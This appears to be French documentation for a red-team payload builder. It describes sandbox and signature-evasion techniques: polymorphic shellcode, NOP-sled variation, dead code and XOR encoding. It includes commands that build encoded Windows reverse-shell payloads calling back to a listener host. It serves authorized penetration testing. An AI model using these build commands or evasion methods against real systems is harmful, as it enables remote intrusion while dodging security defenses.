# Anti-Sandbox Techniques - Documentation

## 📋 Vue d'Ensemble

Ce document décrit les techniques anti-sandbox implémentées dans `packet-forger-payloads` pour éviter la détection par les environnements de sandbox.

**⚠️ Important** : Ces techniques ne sont **PAS** des bypass magiques. Elles visent à :
- Éviter la détection par signature
- Délayer l'exécution dans les sandboxes automatisées
- Vérifier l'environnement avant l'exécution

## 🎯 Techniques Implémentées

### 1. Polymorphisme

**Objectif** : Générer un shellcode unique à chaque exécution pour éviter la détection par signature.

**Implémentation** :
- NOP sleds variés (8 variantes différentes)
- Instructions équivalentes (remplacement par équivalents)
- Dead code insertion (code mort aléatoire)
- Encodage XOR avec clé aléatoire

**Limitations** :
- Ne bypass pas les sandboxes comportementales avancées
- Ne protège pas contre l'analyse statique approfondie

### 2. Délais et Attentes

**Objectif** : Détecter les sandboxes qui exécutent le code trop rapidement.

**Technique** :
- Délais aléatoires avant l'exécution du payload principal
- Vérification du temps système (sandboxes peuvent accélérer le temps)

**Limitations** :
- Les sandboxes modernes peuvent simuler le temps
- Peut ralentir l'exécution légitime

### 3. Vérifications Environnementales

**Objectif** : Détecter les environnements de sandbox.

**Vérifications possibles** :
- Présence de processus de monitoring
- Taille de la mémoire disponible (sandboxes ont souvent peu de RAM)
- Nombre de CPU cores (sandboxes souvent limitées)
- Présence de fichiers système spécifiques

**⚠️ Note** : Ces vérifications ne sont **PAS** implémentées dans le code actuel pour éviter les faux positifs. Elles sont documentées ici à titre informatif.

## 📊 Statut Actuel

### Implémenté

✅ **Polymorphisme** :
- Génération unique de shellcode
- NOP sleds variés
- Dead code insertion
- Encodage XOR optionnel

### Non Implémenté (Documentation)

❌ **Délais temporels** : Non implémenté (peut causer des faux positifs)
❌ **Vérifications environnementales** : Non implémenté (peut bloquer l'exécution légitime)

## 🔍 Comment Ça Fonctionne

### Génération Polymorphe

```bash
# Chaque génération produit un shellcode différent
./bin/payload-builder build windows reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --polymorphic --output payload1.bin

./bin/payload-builder build windows reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --polymorphic --output payload2.bin

# payload1.bin ≠ payload2.bin (même fonctionnalité, code différent)
```

### Encodage XOR

```bash
# Génération avec encodage XOR
./bin/payload-builder build windows reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --polymorphic --encode-xor --output payload_encoded.bin
```

Le shellcode est encodé avec une clé XOR aléatoire et un stub de décodage est ajouté.

## ⚠️ Limitations et Avertissements

### Ce que les Techniques Anti-Sandbox NE FONT PAS

1. **Ne bypassent pas les sandboxes comportementales** :
   - Analyse du comportement réseau
   - Détection d'activité suspecte
   - Monitoring système avancé

2. **Ne protègent pas contre l'analyse statique approfondie** :
   - Reverse engineering
   - Analyse de code avec outils professionnels
   - Détection de patterns dans le code

3. **Ne garantissent pas l'évasion** :
   - Les sandboxes modernes sont sophistiquées
   - Les techniques évoluent constamment
   - Aucune technique n'est infaillible

### Recommandations

1. **Utilisation responsable** :
   - Uniquement pour des tests autorisés
   - Dans des environnements contrôlés
   - Avec autorisation explicite

2. **Compréhension des limitations** :
   - Ne pas sur-vendre ces techniques
   - Comprendre qu'elles ne sont pas magiques
   - Tester dans différents environnements

3. **Évolution continue** :
   - Les techniques anti-sandbox doivent évoluer
   - Les sandboxes s'améliorent constamment
   - Aucune solution n'est définitive

## 📚 Références

- **Polymorphisme** : Technique classique d'évasion de signature
- **Encodage XOR** : Obfuscation basique mais efficace
- **Dead Code** : Insertion de code non exécuté pour brouiller l'analyse

## 🔗 Voir Aussi

- **[WINDOWS_ASM_REVERSE_SHELL.md](WINDOWS_ASM_REVERSE_SHELL.md)** : Génération de shellcode Windows
- **[POLYMORPHIC_SHELLCODE.md](../docs/POLYMORPHIC_SHELLCODE.md)** : Techniques de polymorphisme détaillées

---

**Note** : Cette documentation est fournie à des fins éducatives. L'utilisation de ces techniques doit être légale et autorisée.

